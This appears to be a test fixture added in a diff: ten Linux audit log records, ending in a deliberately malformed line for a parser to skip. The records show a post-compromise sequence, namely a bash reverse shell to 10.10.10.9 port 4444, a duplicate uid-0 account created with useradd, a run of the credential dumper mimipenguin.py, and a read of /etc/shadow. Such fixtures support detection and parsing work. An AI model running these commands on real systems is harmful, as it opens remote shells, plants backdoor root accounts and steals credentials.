@@ -1,0 +1,10 @@
+type=SYSCALL msg=audit(1742198400.100:1001): arch=c000003e syscall=59 success=yes exit=0 ppid=6999 pid=7000 auid=1000 uid=33 comm="bash" exe="/usr/bin/bash" key="exec"
+type=EXECVE msg=audit(1742198400.100:1001): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/10.10.10.9/4444 0>&1"
+type=PROCTITLE msg=audit(1742198400.100:1001): proctitle=626173680...
+type=SYSCALL msg=audit(1742198400.200:1002): arch=c000003e syscall=59 success=yes exit=0 ppid=7000 pid=7100 auid=1000 uid=0 comm="useradd" exe="/usr/sbin/useradd" key="exec"
+type=EXECVE msg=audit(1742198400.200:1002): argc=4 a0="useradd" a1="-o" a2="-u" a3="0"
+type=SYSCALL msg=audit(1742198400.300:1003): arch=c000003e syscall=59 success=yes exit=0 ppid=7000 pid=7200 auid=1000 uid=33 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1742198400.300:1003): argc=2 a0="python3" a1="mimipenguin.py"
+type=SYSCALL msg=audit(1742198400.400:1004): arch=c000003e syscall=257 success=yes exit=3 ppid=7000 pid=7300 auid=1000 uid=33 comm="cat" exe="/usr/bin/cat" key="sensitive"
+type=PATH msg=audit(1742198400.400:1004): item=0 name="/etc/shadow" nametype=NORMAL
+this garbage line must be skipped without crashing
